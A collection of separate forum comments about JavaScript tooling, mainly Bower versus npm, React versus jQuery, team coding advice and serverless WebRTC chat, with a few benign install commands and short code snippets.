&gt; This whole question is bizzare and ass-backwards The question is actually pretty straight-forward and interesting if you're not bending over backwards to be an asshole about it: *"Was there was any conflict between assembly developers and early adopters of C."* is how I'd rephrase it. &gt; without the web a language couldn't go "viral" The word "meme" was coined in 1976 by Richard Dawkins to describe how ideas quickly disseminate throughout a population. So yeah, while things can go "viral" quicker today and to a larger audience it doesn't mean the concepts didn't exist before the web. The relatively quick spread of Christianity would be an example of how an idea went viral even thousands of years ago. It may surprise young people but there were many ways for people to communicate and share ideas before the interent was a thing. We had trade magazines, mail, conferences, telephones, dialup and BBS, marketing, university programs, etc.
Still this depends on the plugin authors to use peer dependencies correctly. What happens when a plugin you depend on in your ecosystem has incorrectly authored peerDeps?
http://www.careerist.org/6-little-known-gems-javascript-world-beginner
It's the same use case I was thinking of.
I like this, personally. Bower typically includes the minified and all the component files. If there's an issue that shows up in minified code, I can toggle to the full source rather easily. 
"There's no reason to learn a new technology until someone pays you to learn a new technology" - The Internet
**Start by identifying the minimum features needed for a working game. You can elaborate later if you have time.** For example, if you're building a high-card-wins game in which a player can draw a card against the computer, you absolutely need a random card generator, a turn mechanism, and a means for the program to compare the values of the cards. It is not essential that you have graphics of cards for the program to be functional, so you can put that off until later (unless you have someone twiddling their thumbs). **Next, identify dependencies between features and put priority on developing features which other features rely on.** Before you can compare card values, you must have the card values. Before you can track how many hands each player has won, you must be able to compare card values. **It is often harder to work on a feature than it is to work on the whole program.** You can try to divide the work into logical chunks and have each person work on pieces separately, but you may find it easier to share the code and have each person resolve issues and develop components. When working on the code, you may all be working to solve the same problems at times until someone gets it to work. You may be talking about possible approaches to resolve issues, sharing links to resources, looking for efficiency and coding standards, etc. When the code is working as intended and up to standards, then it becomes the new base code. **Working in groups can suck.** Sometimes there will be unreliable group members who you have to do the work without, or a member who always seems to get the solution first. The second is a worse learning experience, so if you're in that situation assign portions of the work - basically, you're restricting the high performer from doing all the work. If you have unreliable group members, just work without them. Sometimes you can have a group member who is obviously struggling with concepts.Do try to help them understand in terms they can understand, but the fact is coding is more natural to some than others. It is still part of the project to create graphics, possibly write a storyline or text, etc. And you can usually just ask who can do what and each of you will know your strengths. Of course, if it's a class that requires everyone to write code, you'll have to advise and explain, just don't do the code for the other person even if you've already done it - let them learn at the pace they need to go. **Cool is worth doing** Have fun.
It makes it far easier for package maintainers to make releases since it just uses git tags. 
No, not really. Again, most of those vulnerabilities are related to Express, which is a product built in top of Node.js. And the few others related to Node.js per se, can be fixed using a sensible approach with security in mind. Come to think of it, then yes, it's like saying that Ruby is insecure because of RoR. Which makes no sense, since RoR is a project built on top of Ruby. That doesn't mean that Ruby, or rather its implementation, is insecure.
Uhm, what do you develop?
That's true today but when NPM was originally designed none of that existed. Thus I feel NPM is a flawed product.
"We'll get the client to pay for it!" 
This is amazing
If I'm understanding you correctly, you [can do this](http://stackoverflow.com/questions/18245394/ignore-in-bowers-bower-json).
For an example of how to use wzrd.in with the client, check out https://github.com/maxogden/requirebin (I'm touched that you mentioned my weekend project btw)
This. A thousand times this. This is actually the main reason I stopped using Bower - it doesn't allow for any configuration in terms of what you want to get. Additionally, many of the libraries on Bower don't follow a uniform specification - so sometimes you'll get unminified source files, other times you'll get the full source and distribution, sometimes you get documentation....it's a shit show, honestly. 
I think people are missing the point here. I don't do much JavaScript but I always thought of it like this: `bower` is for static assets like fonts, styles, and scripts. I use it for zurb, jquery, font-awesome. `npm` is for tools for a node.js backend app or generators / build runners for frontend app.
Randomly upgrade you version of a dependency if you have another dependency with it as its own dependency. Example. My bower.json file specifies jquery version 1.10.2 but I have another dependency, some countdown library, that has jquery in its own bower.json file, although it specifies jquery =&gt; 1.something. Bowers behaviour then is to install jquery 1.10.2 sometimes and jquery 2.something (whatever is the latest version) other times. Apparently you are supposed to be able to force a version using requirements:{} (or something like that), but... it doesn't work. *sigh*
Oh yeah. That's what I've been looking for. Why don't major bower packages use this more?
no reason to reinvent the wheel here. It's only a matter of time that Fecha.js will become bloated like moment.js, that is, if it doesn't become abandoned like most "libraries" posted here
I find that it's very hit or miss and some people simply don't know about it. If you find a repo that doesn't do it, the best way to help is to get a PR in there!
I think the point many people in here make is that `npm` can also be used to install jquery and other static assets. And it's not quite clear if bower is "better" at it. Where "better" can mean many different things.
"flawed product"? Was that a reference to "today" or to "when [it] was originally designed"?
package managers
Not quite what I mean. Let's take the specific example of Three.js: https://github.com/mrdoob/three.js/blob/master/bower.json They have both `main` and `ignore` defined, but from what I can tell, for Bower to ever get around to reading the bower.json file, it has to clone the entire repository first, then *deletes* the ignored stuff. So it basically makes itself useless for managing deployments on my VPS. I have a bunch of different sites on the same server, all fairly small things. And while there is plenty of room for what my most recent site needs, I don't have enough room left to clone the entire Three.js repo. Nor do I care to spend all that bandwidth, either. So Bower fails to install my dependencies, which was the only reason I ever had it around in the first place. ONE JOB!! And I'm back to just doing FTP deployments. It just seems like it should be able to pre-check for the bower.json and only clone the whole repo if there isn't one, or if no main/ignore is defined.
I really want to give a talk, possibly at fluent. Is t too late to sign up and/or apply for giving a talk? 
Good point. I maintain packages that are published to both Bower and NPM, and I have to manually run `npm publish` while Bower picks it up automatically.
1. None of what existed? 2. Are you saying that whatever didn't exist originally does exist now and that's why you think npm is a flawed product?
Promises promises confusion and unstructured code, Visit AJOMS.COM if you want to really learn about Web-site Asynchronous JavaScript Object Management; this author's/Company's tutorial is superficial, archaic and "Promises" Programming headaches.
I probably should have included this. Here's an example of one of the currently broken scripts from the original author. http://www2.arnes.si/~gljsentvid10/longterm.htm 
You should make that happen. It shouldn't be too dificult to add that functionality.
hah. The function is defined as `function trunc()`, but it's called from within `with (Math)`. Love it Just another example why `with` is in the top 3 worst features in JS
+ bower doesn't have the "scripts" thingy + bower doesn't let you publish to npm 
CSS probably changes less frequently than js, so you're loading non-cached css more often than you otherwise would. It can be easy to inadvertently change css require order and break something. Pros are that the styles live closer to the code and there are fewer files for the client to download.
My bad! Bower 1 / NPM 1.
You have your parallels wrong. The web is Unix (hip platform). JS is machine code (native compilation target). The viral thing is coding for the platform, not the language. Therefore, the valid comparison would be Dart/typescript/... vs C
If they have zero programming experience Khan Academy's introduction is excellent. It's processing.js rather than vanilla JS, but it introduces the core concepts of coding very well. They actually use this at my son's school. https://www.khanacademy.org/computing/computer-programming
This (short) book is an excellent outline of how to produce software with a team of devs. Just ignore the buzzwords and streamline where you need to: http://www.infoq.com/minibooks/scrum-xp-from-the-trenches
Bower is grossly bloated, however I can vouch for volo, it gets the packages straight from github unlike bower that requires bower.json n be registered there to download.
shoot.
Remember that webpack config isn't json, is js and processed as such. you can include logic to determine whether to include or not certain plugins depending on environment variables or process arguments. :)
 npm dedupe
"nothing" would be a correct answer..
&gt; P must have a function with name C. &gt; • P must include at least one expression new C() or Object.create(C.prototype). &gt; • For each a ∈ A, the function C must include an assignment this.a = Exp or P must include an assignment C.prototype.a = Exp. &gt; • For each m ∈ M, function C must include an assignment this.m = function {Exp} or P must include an assignment C.prototype.m = function {Exp}. What's wrong with their methodology for finding classes?
You **can't** install **npm with bower**, so it sucks. However, you can easily install **bower with npm**: npm install bower -g Though you **can** install **npm with npm**, but can't install **bower with bower**. So there's that. npm install npm -g
Oh, I see! Sorry, I definitely misunderstood you at first then. Er, while I kinda agree with you, I think the VPS part is more of a you problem. Most people, IMO, don't have those kind of storage/bandwidth issues. If it really, really bothers you, though, you could probably do it with grunt at least? Also, I don't think I disagree with what they do; it makes the command arbitrarily simple: you can guarantee you're always git cloning.
That's what their stated purposes are, but as far as I can tell bower doesn't actually *do* anything that I can't do with npm and browserify. I think that's why OP is asking the question. I'm pretty sure your three examples that you install with bower can also be installed with npm. Personally, I haven't found any reason to use bower. I tried it, but it seemed redundant.
What's your background, ken? You don't sound too technical ...
The comparison of the [vanilla jQuery vs React](https://medium.com/@joaomilho/arguing-for-reactjs-7b80aafc6493#adec) is pretty unfair. Writing jQuery using just callback spaghetti is a terrible way to write code. I've been writing 'componentised' JavaScript for years, which is a much cleaner way to do it. Here is an example: class Toggler constructor: -&gt; @visible = true $('.toggler').click @toggle toggle: =&gt; @visible = !@visible @render() render: -&gt; if @visible $('.toggled').show(); else $('.toggled').hide(); [JSFiddle link](http://jsfiddle.net/L3u4b6nx/1/) For this example, this code has the same benefits as the React version.
Are you talking about version pinning? You can use npm shrinkwrap for that.
&gt;Written by Eric Elliott &gt;Compassionate entrepreneur on a mission to end homelessness. Well he is compassionate (even if he does say so himself). So you know - peace, love, hope or something man.
Im sorry, but that list of things "To come to a consensus on" is laughable. In your mind, the #1 question that needs to be answered to build a scaleable, distributed, secure, data storage and transmission protocol, is whether to use jQuery or Angular? Edit* wether is actually speld whether, who knew. 
Ewwwww, academia.
&gt; For this example, this code has the same benefits as the React version. Not really. The React example is still fundamentally different because there is no manual dom manipulation, which is the the main advantage of React. You never have to do any Dom manipulation like $(toggled).hide() in React. Instead you re-render the virtual Dom and React generates the Dom manipulation code for you. Your example is trivial, so it doesn't really matter, but in a real app where you are coordinating many different dom changes React makes the code much less error prone and more performant because you no longer have to reason about Dom updates. React is kinda like a compiler in a sense. Even in your simple example there is a bunch if code you might need to add IRL. You might need to null check $('.toggled') before calling .hide(). Your object's state might get out of sync with the Dom state, so you might need to check if it is already hidden. You might need to do some buffering in case that method gets called a bunch in the same event loop tick. Maybe you don't need to do the Dom update at all because it's parent is going to be removed from the dom later in the same tick. React figures out all this stuff for you automatically and you don't have to code it.
&gt; We consider that a class C2 is a subclass of C1 if C2's prototype's prototype is C2's prototype. &gt; http://i.imgur.com/x31bbwZ.png I think you meant "C2's prototype's prototype is C**1**'s prototype". 
How is this not the top answer? This is the fundamental difference, and the entire reason that bower exists. Use bower when you need to load a single version of each dependency.
Khan academy is great, that is a nice find! thx.
For deployment, I wrote a [script](https://github.com/umeboshi2/paella/blob/master/client/scripts/prepare-bower-components.py) that parses `bower list --paths --json` and copies only the necessary components into another directory that can be tarred and sent to the server.
This year for the first time there will be [JSConf.Budapest](http://jsconfbp.com). I highly recommend to take a look, the guys behind the event are dedicated to make a good, interesting line-up :) 
Install bootstrap
That css presentation puts a lot of people off react. Many, many people use sass and less, and that inline javascript css thing is too far from current best practises for frontend developers. ...but you dont have to use it. Its also totally possible to mix coffeescript / atscript / typescript into a react component, and just use jsx for the markup expansion. Thats what we need; better coverage of using existing tools with react; less 'drop everything and react!' 
To completely remove any server is just nearly impossible right now, even https://github.com/cjb/serverless-webrtc/ which utilizes key sharing via email/text message/hand written notes still uses a stun/turn server for establishing connections behind a nat/firewall/etc. So if you're ok with that server interaction you can make a simple chat application such as the demo on the previously linked repo. If you want to take it a step farther and have some kind of persistence you'd have to allocate some kind of database that's shared between clients or individual client side databases that are synced upon connection to the group. This can be as simple as a textbox on the page or as complex as nodewebkit/nw with an actual database. But as it stands, the easiest route would involve at least two servers, the signaling server (usually hosted node.js socket.io) and a stun/turn server. edit: https://github.com/louischatriot/nedb looks to be a nice, in memory, json flat file type of datastore, this could work for the persistence. There would have to be quite a bit of logic as to avoid duplication, duplicate IDs, etc though. edit 2: if you're going to go the nodewebkit/nw route then you could just use https://github.com/louischatriot/nedb with the https://www.npmjs.com/package/http-server package and run that with https://github.com/cjb/serverless-webrtc/ sharing updated JSON blobs between connected users and parsing those out to formatted text/html inside of the served page, a polled sync of the page contents to update the nedb database with some flags on content, new/updated/date/content/etc to ensure data isn't duplicated or an archive function similar to git diffs / history would (and probably would) be better. Although this could run into quite large databases and horrible sync times for new users. 
You can open HTML files locally in your browser. IE will ask you to allow it to run scripts before it executes any of the Javascript so just make sure to allow it.
Yes, you can use headless browsers like PhantomJS for example. Here is an article on that subject http://developer.telerik.com/featured/journey-client-side-testing-javascript/